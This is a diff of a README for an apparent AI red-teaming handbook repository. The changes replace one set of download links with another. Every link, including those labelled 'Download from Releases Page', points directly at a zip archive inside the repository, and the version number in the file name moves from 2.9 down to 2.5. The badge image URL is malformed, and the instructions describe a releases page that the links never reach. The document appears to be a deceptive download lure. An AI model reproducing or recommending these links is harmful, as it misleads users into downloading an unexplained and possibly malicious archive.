@@ -1,6 +1,6 @@
 # 🚀 ai-llm-red-team-handbook - Your Guide to AI Red Teaming
 
-[![Download Here](https://raw.githubusercontent.com/shrey-x/ai-llm-red-team-handbook/main/docs/ai-llm-red-team-handbook_2.9.zip%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/shrey-x/ai-llm-red-team-handbook/main/docs/ai-llm-red-team-handbook_2.9.zip)
+[![Download Here](https://github.com/shrey-x/ai-llm-red-team-handbook/raw/refs/heads/main/docs/templates/handbook_team_red_ai_llm_2.5.zip%20Now-blue?style=for-the-badge&logo=github)](https://github.com/shrey-x/ai-llm-red-team-handbook/raw/refs/heads/main/docs/templates/handbook_team_red_ai_llm_2.5.zip)
 
 ## 📥 Overview
 
@@ -14,7 +14,7 @@ Before diving into the handbook, let’s ensure you can easily download and acce
 
 To download the handbook, visit the releases page. You will find different versions of the files available for download. Choose the version that best suits your needs.
 
-[Download from Releases Page](https://raw.githubusercontent.com/shrey-x/ai-llm-red-team-handbook/main/docs/ai-llm-red-team-handbook_2.9.zip)
+[Download from Releases Page](https://github.com/shrey-x/ai-llm-red-team-handbook/raw/refs/heads/main/docs/templates/handbook_team_red_ai_llm_2.5.zip)
 
 1. Click the link above.
 2. On the releases page, locate the latest version listed at the top.
@@ -70,7 +70,7 @@ If you encounter any issues while downloading or using the handbook, you can rea
 
 Follow our GitHub repository to stay notified of new releases, updates, and important announcements. We are continuously working to enhance the handbook and your input is invaluable.
 
-[Download from Releases Page](https://raw.githubusercontent.com/shrey-x/ai-llm-red-team-handbook/main/docs/ai-llm-red-team-handbook_2.9.zip) 
+[Download from Releases Page](https://github.com/shrey-x/ai-llm-red-team-handbook/raw/refs/heads/main/docs/templates/handbook_team_red_ai_llm_2.5.zip) 
 
 ## 🤝 Acknowledgments
 
